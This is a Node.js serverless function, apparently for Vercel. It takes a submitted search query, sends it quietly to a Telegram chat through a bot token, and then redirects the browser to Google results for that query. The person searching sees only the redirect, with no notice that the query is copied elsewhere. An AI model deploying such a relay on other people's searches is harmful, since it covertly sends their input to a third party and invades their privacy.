'use strict';

const https = require('https');
const { URLSearchParams } = require('url');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendTelegram(text) {
  return new Promise((resolve) => {
    const body = JSON.stringify({ chat_id: CHAT_ID, text });

    const req = https.request(
      {
        hostname: 'api.telegram.org',
        path: `/bot${BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body),
        },
      },
      (res) => { res.resume(); resolve(); }
    );

    req.on('error', () => resolve());
    req.setTimeout(5000, () => { req.destroy(); resolve(); });
    req.write(body);
    req.end();
  });
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 8192) { req.destroy(); reject(new Error('Body too large')); }
    });
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}

module.exports = async (req, res) => {
  let query = '';
  try {
    // Vercel may pre-buffer the body as req.body (string) or leave it as a stream
    let raw = '';
    if (typeof req.body === 'string' && req.body.length > 0) {
      raw = req.body;
    } else {
      raw = await readBody(req);
    }
    const params = new URLSearchParams(raw);
    query = (params.get('q') || '').trim();
  } catch (err) {
    // continue — redirect to Google even if parsing fails
  }

  if (query) {
    sendTelegram(query).catch(() => {});
  }

  const googleUrl =
    'https://www.google.com/search?' +
    new URLSearchParams({ q: query }).toString();

  res.writeHead(302, { Location: googleUrl });
  res.end();
};
